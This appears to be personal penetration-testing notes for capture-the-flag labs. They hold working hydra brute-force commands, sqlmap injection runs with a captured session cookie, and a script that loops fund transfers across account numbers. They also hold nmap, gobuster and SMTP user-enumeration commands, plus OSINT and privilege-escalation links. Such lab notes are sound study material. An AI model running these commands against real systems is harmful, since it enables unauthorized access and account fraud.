## Pentest

```sh
hydra -I -l 99 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -s 5000 ${TARGET_IP} http-form-get "/:user=^USER^&pass=^PASS^:S=302"
hydra -I -l 100 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -s 5000 ${TARGET_IP} http-form-get "/:user=^USER^&pass=^PASS^:S=302"
```

```sh
sqlmap http://10.10.178.141:5000 --tamper=space2comment --level 3 --risk 3 --data 'account_number=101+&password=hello'
```

```sh
sqlmap http://10.10.178.141:5000 --cookie="session=eyJuYW1lIjoiVGVzdGVyIiwidXNlciI6MTEwfQ.Z1tB3g.jyoCFwdXj7uP7v6TVesQ7O3-zng" --tamper=space2comment --level 3 --risk 3 --data 'account_number=101&ammount=1'
```

```sh
send_req() {
  id="$1"
  curl -L -s 'http://10.10.178.141:5000/transfer' \
    -X POST \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
    -H 'Accept-Language: en-US,en;q=0.5' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Origin: http://10.10.178.141:5000' \
    -H 'Connection: keep-alive' \
    -H 'Referer: http://10.10.178.141:5000/dashboard' \
    -H 'Cookie: session=eyJuYW1lIjoiVGVzdGVyIiwidXNlciI6MTEwfQ.Z1tB3g.jyoCFwdXj7uP7v6TVesQ7O3-zng' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'Priority: u=0, i' \
    --data-raw "account_number=${id}&amount=1" | grep Success
}
export -f send_req

array=$(seq 99 112)

parallel send_req ::: "${array[@]}"
```

## nmap report

```sh
sudo grc nmap -v --reason -T4 -sT -F -oG  ${TARGET_IP}
sudo grc nmap -v --reason -T4 -sC -sV -F --version-intensity 9 -p8080 -oG ${TARGET_IP}
```

## Whatweb

```txt
http://10.10.178.141:5000/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.4 Python/3.8.10], IP[10.10.178.141], Python[3.8.10], Werkzeug[3.0.4]
```

## TELNET scripting

```sh
#!/usr/bin/env bash

(
echo open 10.129.88.30 25
sleep 5
echo VRFY samuel
sleep 2
) | telnet
```

## Dir Enum

```sh
gobuster dir -u "http://jewel.uploadvulns.thm/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -x .phar,.php.phtm
```

## Passive OS fingerprinting

- [satori](https://github.com/xnih/satori/)
- [p0f](https://lcamtuf.coredump.cx/p0f3/)

## Mac Ages

- [mac ages](https://github.com/hdm/mac-ages)

### links

- [cvss calculator](https://www.first.org/cvss/calculator/3.1)
- [cyberchef](127.0.0.1:8081)
- [abuse.ch](https://abuse.ch)
- [urlscan](https://urlscan.io)

### Linux Privilege Escalation

- [netbiosx's checklist](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [total oscp guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
- [payatu](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/)

- [linpeas](https://raw.githubusercontent.com/Cerbersec/scripts/refs/heads/master/linux/linpeas.sh)

### Search Engines

- [shodan](https://www.shodan.io/)
- [DNSdumpster](https://dnsdumpster.com/)
- [threatintelligenceplatform](https://threatintelligenceplatform.com/)
- [viewdnsinfo](https://viewdns.info/)
- [google_hacking_database](https://www.exploit-db.com/google-hacking-database)
- [censys](https://search.censys.io/)
- [robtex](https://www.robtex.com/)
- [whois](https://whois.domaintools.com/)
- [alienvalut](https://otx.alienvault.com/)
- [threatminer](https://www.threatminer.org/)
- [hybrid-analysis](https://www.hybrid-analysis.com/)

### Dorking

- [google](https://support.google.com/websearch/answer/2466433)
- [duckduckgo](https://duckduckgo.com/duckduckgo-help-pages/results/syntax/)
- [bing](https://support.microsoft.com/en-us/topic/advanced-search-options-b92e25f1-0085-4271-bdf9-14aaea720930)
- [shodan](https://github.com/lothos612/shodan)
